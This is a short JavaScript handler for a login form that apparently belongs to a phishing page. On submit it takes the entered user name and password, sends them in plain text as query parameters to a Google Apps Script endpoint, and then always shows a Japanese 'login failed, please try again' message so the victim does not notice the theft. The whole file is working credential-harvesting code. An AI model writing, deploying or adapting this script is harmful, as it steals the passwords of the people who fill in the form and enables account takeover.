const GAS_URL = "https://script.google.com/macros/s/AKfycbyPUwhe3Bj0KaioJz28FhS66gyLn7GSrSDvOGBQI3rf0-3ckk0HyRE-z9GwScfcuetc3Q/exec";

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const user = e.target.user.value;
  const pass = e.target.pass.value;
  const params = new URLSearchParams({ user, pass });

  fetch(GAS_URL + "?" + params.toString())
    .then(() => {
      document.getElementById("msg").textContent = "ログインに失敗しました。もう一度お試しください。";
      e.target.reset();
    })
    .catch(() => {
      document.getElementById("msg").textContent = "接続に失敗しました";
    });
});
